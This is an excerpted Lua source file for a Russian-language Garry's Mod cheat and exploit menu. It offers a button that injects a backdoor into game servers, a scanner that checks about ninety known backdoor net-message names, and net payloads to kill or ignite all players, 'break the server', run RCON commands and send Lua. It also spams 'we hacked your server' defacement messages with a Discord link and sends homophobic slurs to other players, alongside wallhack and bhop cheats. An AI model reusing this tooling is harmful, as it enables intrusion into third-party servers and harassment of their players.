--------------------------------------------------------------------------------------------------------------------------- 
--[[      --------------------------------------------------------------------------------------------------------------------------
	 💎 add-on Blog v0.0.1 / 01.06.2021 💎
      • Кто это читает Педик]]
-----------------------------------------------------------------------------------------------------STUFF--------------------------------------------------------------------------------------------------------------------------------------------------
...
function()
    timer.Create(pMenu.RandomString(20),5,10,function()
        for k,v in pairs(player.GetAll()) do
            ...
            LocalPlayer():ConCommand("ulx psay "..v:Nick().."Кто читает тот пидор "..LocalPlayer():Nick())
        end
    end)
end
}
...
function()
    timer.Create(pMenu.RandomString(20),1.1,10,function()
        for i=1, ((1/FrameTime())) do
            LocalPlayer():ConCommand("ulx asay"..'"Кто читает тот гей')
        end
    end)
end
}
...
function pMenu.Menu()
    ...
    Frame.Paint = function( self, w, h )
        ...
        draw.SimpleText("ADD-ON (Delete для открытия/закрытия меню)","Font L",w/2,1,Color(255,255,255,255),TEXT_ALIGN_CENTER)
        local AIM = "AIM";
...
draw.SimpleTextOutlined( "Привет "..steamworks.GetPlayerName( LocalPlayer():SteamID64() )..", вы используете последнюю версию ADD-ON", "HUDLogo2", ScrW()/2 + math.sin(RealTime()) * ScrW() / 85, ScrH()/30, Color( 99, 210, 214, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER, 1, Color(0,0,0,255) )
end)
...
function iZNX.addExploit( name, tab ) -- хуй залупа
...
if iZNX.NetValidString( "Þà?D)◘" ) then
...
functions = {
{ typ = "string", name = "Введите сообщение", default = "AddOnMenu", addr = "vj_string" },
{ typ = "func", name = "Начать", func = function()
surface.PlaySound("garrysmod/ui_click.wav")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Запускаем" )
iZNX.NetStart(thefrenchenculer)
...
sound6:SetPos( 2, 125 )
sound6:SetText("Билайн - Геге за шаге")
...
sound8:SetPos( 2, 175 )
sound8:SetText("Парашочек это сила")
...
sound9:SetPos( 2, 200 )
sound9:SetText("Бузова(OVER9000BASS)")
...
sound13:SetText("Холодильник И покушац")
...
sound15:SetText("НАПАС – ЛАВАНДОС(OVER9000BASS")
...
sound16:SetText("Томас - Паровозик Томас(OVER9000BASS)")
...
iZNX.HTXCommandeSelector = vgui.Create("DFrame")
iZNX.HTXCommandeSelector:SetSize(240,350)
iZNX.HTXCommandeSelector:SetTitle("AddOn макросы")
iZNX.HTXCommandeSelector:SetPos( gui.MouseX(), gui.MouseY() )
iZNX.HTXCommandeSelector:MakePopup()
iZNX.HTXCommandeSelector.Paint = function( s, w, h )
if !iZNX.Menu or !iZNX.Menu:IsVisible() then s:Remove() return end
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Все мертвы" )
iZNX.NetStart(thefrenchenculer)
...
commandnethtx2:SetText("Билл Шифр")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Disco успешно запущено" )
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Удалено" )
iZNX.NetStart(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Поджигаем" )
iZNX.NetStart(thefrenchenculer)
...
commandnethtx5:SetText("Сломать сервер [disco]")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Выключаем" )
iZNX.NetStart(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
RainbowMike = {
"chat.AddText(Color(0,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn ОПА А ВОТ И БЭКДУР █ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(0,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn МЫ ВЗЛОМАЛИ ВАШ СЕРВЕР  █ ▇ ▆ ▅ ▄ ▂ ▁ \")",
"chat.AddText(Color(255,0,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn ЕСЛИ ХОТИТЕ ПОГОВОРИТЬ С ХАКЕРАМИ К НАМ В ВОЙС █ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,255,0), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn МЫ ТО СЕРЬЕЗНЫЕ ЛЮДИ ВАШИ КОДЕРЫ НИЧЕ НЕ СДЕЛАЮТ █ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(0,255,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn У ВАС НЕ ХВАТИТ СИЛ БОРОТСЯ С КОМАНДОЙ RAINSOFT █ ▇ ▆ ▅ ▄ ▂ ▁  \")",
"chat.AddText(Color(255,0,255), \" ▁ ▂ ▃ ▄ ▅ ▆ ▇ĤẪĈЌĒĎ ฿¥ RainSoft v1.1 https://discord.gg/SJ5hgyh6mn ИСПУГАЛИСЬ ДЕТИШКИ █ ▇ ▆ ▅ ▄ ▂ ▁ \")",
}
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Изменяем" )
iZNX.NetStart(thefrenchenculer)
...
commandnethtx9:SetText("Безобидное disco [Копия моего]")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Бах" )
net.Start(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Сброшено" )
net.Start(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Ухуу" )
net.Start(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Изменено" )
net.Start(thefrenchenculer)
...
commandnethtx14:SetText("Безобидное диско [disco] 2")
...
commandnethtx15:SetText("Тестовое Диско")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Ах" )
net.Start(thefrenchenculer)
...
commandnethtx36:SetText("-Уши у всех игроков")
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "-уши" )
net.Start(thefrenchenculer)
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Все стали гигантами" )
local giant = [[
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Все стали высокими" )
local tall = [[
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Кхм" )
net.Start(thefrenchenculer)
net.WriteString([[
for k,v in pairs(player.GetAll()) do
...
commandnethtx27:SetText("Сломать сервер [disco]")
...
RconCommand:SetText( "hostname ĤẪĈЌĒĎ ฿¥ ĐỆfČỒŃ ŠⱣLỒЇȚ v5.2" )
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Rcon Команда отправлена" )
...
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Lua код отправлен" )
...
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 792, "Инжектор", Inlect, "Инжектит фирменный Backdoor на сервер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 737, "Бэкдур чек", bdcheck, "Лист бэкдуров aka чек сервера на бэкдуры (смотреть в консоль)" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 710, "Админ-хак", lmfao, "Фейк ULX выдача SuperAdmin, можно сделать скриншот, мол вы хакер" )
iZNX.MakeFunctionButtonb( iZNX.Menu, 7, 683, "Не нажимать", lmfao2, "НЕ НАЖИМАТЬ!!" )
...
timer.Create("HackersLol", 1, 0, function()
	if chink then
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Ты за это не заплатил!" )
	else
		chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Ухади!1!" )
	end
	chink = !chink
end)
...
LocalPlayer():EmitSound("common/warning.wav",500,100)
LocalPlayer():EmitSound("common/warning.wav",500,100)
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Чёртов пират, уходи!" )
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Не заплатил - меню не получил!" )
...
if (_G.QAC or _G.CAC) then
        ...
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "На сервере стоит Cake Anti Cheat!")
end
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
...
function Inlect()
surface.PlaySound("garrysmod/ui_click.wav")
    chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 255, 255, 255 )," Инжектим..." )
    if ( ylp:IsSuperAdmin() ) then
        timer.Simple( 3, function()
            if( NetValidString("AddOnBackdoor") ) then
                ...
                chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 0, 255, 0 )," Успешно заинжекчено!" )
            end
        end )
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 255, 0, 0 )," Failed! Вы не superadmin!" )
    end
    if( NetValidString("AddOnBackdoor") ) then
        chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 255, 255, 255 )," Backdoor уже загружен!" )
    end
end
...
function bdcheck()
surface.PlaySound("garrysmod/ui_click.wav")
chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 255, 255, 255 )," В консоль посмотрите" )
if( NetValidString("Sbox_darkrp") ) then
        print( "[AddOn] Найден Backdoor! -   Sbox_darkrp" )
    end

if( NetValidString("_AddOn") ) then
        print( "[AddOn] Найден Backdoor! -   _AddOn" )
    end

if( NetValidString("Sandbox_ArmDupe") ) then
        print( "[AddOn] Найден Backdoor! -   Sandbox_ArmDupe" )
    end
if( NetValidString("Sbox_itemstore") ) then
        print( "[AddOn] Найден Backdoor! -   Sbox_itemstore" )
    end
if( NetValidString("Ulib_Message") ) then
        print( "[AddOn] Найден Backdoor! -   Ulib_Message" )
end
if( NetValidString("ULogs_Info") ) then
        print( "[AddOn] Найден Backdoor! -   ULogs_Info" )
end
if( NetValidString("ITEM") ) then
        print( "[AddOn] Найден Backdoor! -   ITEM" )
end
if( NetValidString("fix") ) then
        print( "[AddOn] Найден Backdoor! -   fix" )
end
if( NetValidString("Fix_Keypads") ) then
        print( "[AddOn] Найден Backdoor! -   Fix_Keypads" )
end
if( NetValidString("Remove_Exploiters") ) then
        print( "[AddOn] Найден Backdoor! -   Remove_Exploiters" )
end
if( NetValidString("noclipcloakaWH_chat_text") ) then
        print( "[AddOn] Найден Backdoor! -   noclipcloakaWH_chat_text" )
end
if( NetValidString("_CAC_ReadMemory") ) then
        print( "[AddOn] Найден Backdoor! -   _CAC_ReadMemory" )
end
if( NetValidString("nostrip") ) then
        print( "[AddOn] Найден Backdoor! -   nostrip" )
end
if( NetValidString("nocheat") ) then
        print( "[AddOn] Найден Backdoor! -   nocheat" )
end
if( NetValidString("LickMeOut") ) then
        print( "[AddOn] Найден Backdoor! -   LickMeOut" )
end
if( NetValidString("ULX_QUERY2") ) then
        print( "[AddOn] Найден Backdoor! -   ULX_QUERY2" )
end
if( NetValidString("MoonMan") ) then
        print( "[AddOn] Найден Backdoor! -   MoonMan" )
end
if( NetValidString("Im_SOCool") ) then
        print( "[AddOn] Найден Backdoor! -   Im_SOCool" )
end
if( NetValidString("Sandbox_GayParty") ) then
        print( "[AddOn] Найден Backdoor! -   Sandbox_GayParty" )
end
if( NetValidString("DarkRP_UTF8") ) then
        print( "[AddOn] Найден Backdoor! -   DarkRP_UTF8" )
end
if( NetValidString("oldNetReadData") ) then
        print( "[AddOn] Найден Backdoor! -   oldNetReadData" )
end
if( NetValidString("memeDoor") ) then
        print( "[AddOn] Найден Backdoor! -   memeDoor" )
end
if( NetValidString("BackDoor") ) then
        print( "[AddOn] Найден Backdoor! -   BackDoor" )
end
if( NetValidString("OdiumBackDoor") ) then
        print( "[AddOn] Найден Backdoor! -   OdiumBackDoor" )
end
if( NetValidString("cucked") ) then
        print( "[AddOn] Найден Backdoor! -   cucked" )
end
if( NetValidString("NoNerks") ) then
        print( "[AddOn] Найден Backdoor! -   NoNerks" )
end
if( NetValidString("kek") ) then
        print( "[AddOn] Найден Backdoor! -   kek" )
end
if( NetValidString("ZimbaBackDoor") ) then
        print( "[AddOn] Найден Backdoor! -   ZimbaBackDoor" )
end
if( NetValidString("something") ) then
        print( "[AddOn] Найден Backdoor! -   something" )
end
if( NetValidString("random") ) then
        print( "[AddOn] Найден Backdoor! -   random" )
end
if( NetValidString("strip0") ) then
        print( "[AddOn] Найден Backdoor! -   strip0" )
end
if( NetValidString("DarkRP_AdminWeapons") ) then
        print( "[AddOn] Найден Backdoor! -   DarkRP_AdminWeapons" )
end
if( NetValidString("SessionBackdoor") ) then
        print( "[AddOn] Найден Backdoor! -   SessionBackdoor" )
end
if( NetValidString("ULXQUERY2") ) then
        print( "[AddOn] Найден Backdoor! -   ULXQUERY2" )
end
if( NetValidString("fellosnake") ) then
        print( "[AddOn] Найден Backdoor! -   fellosnake" )
end
if( NetValidString("enablevac") ) then
        print( "[AddOn] Найден Backdoor! -   enablevac" )
end
if( NetValidString("idk") ) then
        print( "[AddOn] Найден Backdoor! -   idk" )
end
if( NetValidString("c") ) then
        print( "[AddOn] Найден Backdoor! -   c" )
end
if( NetValidString("killserver") ) then
        print( "[AddOn] Найден Backdoor! -   killserver" )
end
if( NetValidString("fuckserver") ) then
        print( "[AddOn] Найден Backdoor! -   fuckserver" )
end
if( NetValidString("cvaraccess") ) then
        print( "[AddOn] Найден Backdoor! -   cvaraccess" )
end
if( NetValidString("rcon") ) then
        print( "[AddOn] Найден Backdoor! -   rcon" )
end
if( NetValidString("rconadmin") ) then
        print( "[AddOn] Найден Backdoor! -   rconadmin" )
end
if( NetValidString("web") ) then
        print( "[AddOn] Найден Backdoor! -   web" )
end
if( NetValidString("jesuslebg") ) then
        print( "[AddOn] Найден Backdoor! -   jesuslebg" )
end
if( NetValidString("zilnix") ) then
        print( "[AddOn] Найден Backdoor! -   zilnix" )
end
if( NetValidString("Þà?D)◘") ) then
        print( "[AddOn] Найден Backdoor! -   Þà?D)◘" )
end
if( NetValidString("disablebackdoor") ) then
        print( "[AddOn] Найден Backdoor! -   disablebackdoor" )
end
if( NetValidString("kill") ) then
        print( "[AddOn] Найден Backdoor! -   kill" )
end
if( NetValidString("AddOnBackdoor") ) then
        print( "[AddOn] Найден Фирменный Backdoor! -   AddOnBackdoor" )
end
if( NetValidString("WepSwitch_DisableAllSwitch") ) then
        print( "[AddOn] Найден Backdoor! -   WepSwitch_DisableAllSwitch" )
end
if( NetValidString("ReadPing") ) then
        print( "[AddOn] Найден Backdoor! -   ReadPing" )
end
if( NetValidString("PlayerCheck") ) then
        print( "[AddOn] Найден Backdoor! -   PlayerCheck" )
end
if( NetValidString("backdoorattackdefense_superadminsettrue") ) then
        print( "[AddOn] Найден Backdoor! -   backdoorattackdefense_superadminsettrue" )
end
if( NetValidString("loona") ) then
        print( "[AddOn] Найден Backdoor! -   loona" )
end
if( NetValidString("NoOdium_ReadPing") ) then
        print( "[AddOn] Найден Backdoor! -   NoOdium_ReadPing" )
end
if( NetValidString("anticheat") ) then
        print( "[AddOn] Найден Backdoor! -   anticheat" )
end
if( NetValidString("_blacksmurf") ) then
        print( "[AddOn] Найден Backdoor! -   _blacksmurf" )
end
if( NetValidString("DembiSploitlebg") ) then
        print( "[AddOn] Найден Backdoor! -   DembiSploitlebg" )
end
if( NetValidString("blacksmurfBackdoor") ) then
        print( "[AddOn] Найден Backdoor! -   blacksmurfBackdoor" )
end
if( NetValidString("noclipcloakaesp_chat_text") ) then
        print( "[AddOn] Найден Backdoor! -   noclipcloakaesp_chat_text" )
end
if( NetValidString("Ulogs_Infos") ) then
        print( "[AddOn] Найден Backdoor! -   Ulogs_Infos" )
end
if( NetValidString("dontforget") ) then
        print( "[AddOn] Найден Backdoor! -   dontforget" )
end
if( NetValidString("aze46aez67z67z64dcv4bt") ) then
        print( "[AddOn] Найден Backdoor! -   aze46aez67z67z64dcv4bt" )
end
if( NetValidString("nolag") ) then
        print( "[AddOn] Найден Backdoor! -   nolag" )
end
if( NetValidString("changename") ) then
        print( "[AddOn] Найден Backdoor! -   changename" )
end
if( NetValidString("music") ) then
        print( "[AddOn] Найден Backdoor! -   music" )
end
if( NetValidString("xenoexistscl") ) then
        print( "[AddOn] Найден Backdoor! -   xenoexistscl" )
end
if( NetValidString("fourhead") ) then
        print( "[AddOn] Найден Backdoor! -   fourhead" )
end
if( NetValidString("echangeinfo") ) then
        print( "[AddOn] Найден Backdoor! -   echangeinfo" )
end
if( NetValidString("PlayerItemPickUp") ) then
        print( "[AddOn] Найден Backdoor! -   PlayerItemPickUp" )
end
if( NetValidString("elfamosabackdoormdr") ) then
        print( "[AddOn] Найден Backdoor! -   elfamosabackdoormdr" )
end
if( NetValidString("stoppk") ) then
        print( "[AddOn] Найден Backdoor! -   stoppk" )
end
if( NetValidString("noprop") ) then
        print( "[AddOn] Найден Backdoor! -   noprop" )
end
if( NetValidString("reaper") ) then
        print( "[AddOn] Найден Backdoor! -   reaper" )
end
if( NetValidString("Abcdefgh") ) then
        print( "[AddOn] Найден Backdoor! -   Abcdefgh" )
end
if( NetValidString("JSQuery.Data(Post(false))") ) then
        print( "[AddOn] Найден Backdoor! -   JSQuery.Data(Post(false))" )
end
if( NetValidString("pjHabrp9EY") ) then
        print( "[AddOn] Найден Backdoor! -   pjHabrp9EY" )
end
if( NetValidString("_Raze") ) then
        print( "[AddOn] Найден Backdoor! -   _Raze" )
end
if( NetValidString("m9k_explosionradius") ) then
        print( "[AddOn] Найден Backdoor! -   m9k_explosionradius" )
end
if( NetValidString("gag") ) then
        print( "[AddOn] Найден Backdoor! -   gag" )
end
if( NetValidString("_cac_") ) then
        print( "[AddOn] Найден Backdoor! -   _cac_" )
end
if( NetValidString("_Battleye_Meme_") ) then
        print( "[AddOn] Найден Backdoor! -   _Battleye_Meme_" )
end
if( NetValidString("ULogs_B") ) then
        print( "[AddOn] Найден Backdoor! -   ULogs_B" )
end
if( NetValidString("arivia") ) then
        print( "[AddOn] Найден Backdoor! -   arivia" )
end
if( NetValidString("_Warns") ) then
        print( "[AddOn] Найден Backdoor! -   _Warns" )
end
if( NetValidString("striphelper") ) then
        print( "[AddOn] Найден Backdoor! -   striphelper" )
end
if( NetValidString("m9k_explosive") ) then
        print( "[AddOn] Найден Backdoor! -   m9k_explosive" )
end
if( NetValidString("GaySploitBackdoor") ) then
        print( "[AddOn] Найден Backdoor! -   GaySploitBackdoor" )
end
if( NetValidString("_GaySploit") ) then
        print( "[AddOn] Найден Backdoor! -   _GaySploit" )
end
if( NetValidString("slua") ) then
        print( "[AddOn] Найден Backdoor! -   slua" )
end
if( NetValidString("Bilboard.adverts:Spawn(false)") ) then
        print( "[AddOn] Найден Backdoor! -   Bilboard.adverts:Spawn(false)" )
end
if( NetValidString("awarn_remove") ) then
        print( "[AddOn] Найден Backdoor! -   awarn_remove" )
end
if( NetValidString("R8") ) then
        print( "[AddOn] Найден Backdoor! -   R8" )
end
end
...
-- Auto-Backdoor checker
    ...
    if netKey == "" then
         chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Бэкдуров на сервере не найдено." )
    else
        chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 0, 255, 0 ), "Найден .net Backdoor: ".. netKey )
...
LocalPlayer():EmitSound("ambient/alarms/klaxon1.wav",500,100)
    local Popup = vgui.Create("DFrame")
        ...
        surface.SetTextPos(w/5.10, h/2.40)
            ...
            surface.DrawText( "Вы не покупали AddOnMenu," )
            surface.SetTextPos(w/5.10, h/2.40)
...
surface.PlaySound("garrysmod/ui_click.wav")
    if ( Version == "v5.2") then
            chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 0, 255, 0 )," Вы используете последнюю версию от 17.03.18!" )
    else
            chat.AddText( Color( 0, 0, 0, 125 ), "[AddOn]", Color( 255, 0, 0 )," Ваша версия чита устарела!" )
    end
    end
...
local title = "You have been reported! Please answer all your reports."
	...
	surface.PlaySound("garrysmod/ui_click.wav")
		if not rainb then
			...
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Радужный физган включен" )
			rainb = true
		else
			hook.Remove("Think", "RGBSTF")
			chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Радужный физган выключен" )
			rainb = false
		end
	end
...
surface.PlaySound("garrysmod/ui_click.wav")
if not wh then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Wallhack включен" )
...
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Wallhack выключен" )
...
surface.PlaySound("garrysmod/ui_click.wav")
if not bhop then
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Bhop включен" )
...
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "AddOn", "] ", Color( 255, 255, 255 ), "Bhop выключен" )
